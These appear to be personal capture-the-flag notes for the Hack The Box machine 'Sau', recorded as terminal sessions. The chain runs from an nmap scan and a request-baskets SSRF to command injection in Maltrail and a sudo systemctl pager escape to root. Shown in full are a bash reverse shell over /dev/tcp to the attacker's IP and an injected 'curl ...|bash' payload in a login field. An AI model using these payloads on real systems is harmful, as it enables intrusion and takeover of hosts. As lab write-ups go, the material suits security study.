```
┌──(witty㉿kali)-[~/Downloads]
└─$ nmap 10.10.11.224                       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 12:53 EDT
Nmap scan report for 10.10.11.224
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 23.35 seconds

Basket 'witty' is successfully created!

Your token is: ONEyRArNHrDd6bvmKX5kzTCoDq1J2LZXqSE44RM8RGAQ

[CVE-2023-27163 · GitHub](https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3)

[request-baskets SSRF details - CodiMD (sjtu.edu.cn)](https://notes.sjtu.edu.cn/s/MUUhEymt7)

Gr)*|) rot47 vCXYMX

--location           Follow redirects

┌──(witty㉿kali)-[~/Downloads]
└─$ curl --location 'http://10.10.11.224:55555/api/baskets/witty123' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
{"token":"mtXmQpPfEhMJirs8V6OYNue6EZVUSYKENwY_Lk8kDRGm"} 


┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.11.224:55555/k07l70v/ -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/10.10.11.224-55555/-k07l70v-_23-07-21_13-01-17.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-07-21_13-01-17.log

Target: http://10.10.11.224:55555/k07l70v/

[13:01:17] Starting: 
[13:01:31] 401 -    0B  - /k07l70v/counts
[13:01:35] 401 -    0B  - /k07l70v/events
[13:01:36] 200 -   15KB - /k07l70v/favicon.ico
[13:01:40] 200 -    7KB - /k07l70v/index
[13:01:40] 200 -    7KB - /k07l70v/index.html
[13:01:42] 200 -    7KB - /k07l70v/logout
[13:01:48] 200 -    4B  - /k07l70v/ping
[13:01:55] 200 -   26B  - /k07l70v/robots.txt


[Unauthenticated OS Command Injection in stamparm/maltrail vulnerability found in maltrail (huntr.dev)](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/)

┌──(witty㉿kali)-[~]
└─$ cat revshell2
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.19/4444 0>&1"

┌──(witty㉿kali)-[~]
└─$ python3 -m http.server 80   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.224 - - [21/Jul/2023 13:24:29] "GET /revshell2 HTTP/1.1" 200 -

┌──(witty㉿kali)-[~/Downloads]
└─$ curl 'http://10.10.11.224:55555/witty123/login'  --data 'username=;`curl 10.10.14.19/revshell2|bash`'

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 4444                                     
listening on [any] 4444 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.224] 48858
bash: cannot set terminal process group (887): Inappropriate ioctl for device
bash: no job control in this shell
puma@sau:/opt/maltrail$ id
id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
puma@sau:/opt/maltrail$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null

puma@sau:/home$ cd puma
cd puma
puma@sau:~$ ls
ls
user.txt
puma@sau:~$ cat user.txt
cat user.txt
2aead82a633717e1aee4fef4dfcefa91

puma@sau:~$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

This invokes the default pager, which is likely to be [`less`](https://gtfobins.github.io/gtfobins/less/), other functions may apply.


sudo systemctl
!sh


puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!sh
!sshh!sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
cd /root
# ls
ls
go  root.txt
# cat root.txt
cat root.txt
27b757604d8fed39625a97e457f8b2d3

```
![[Pasted image 20230721121754.png]]

[[Weasel]]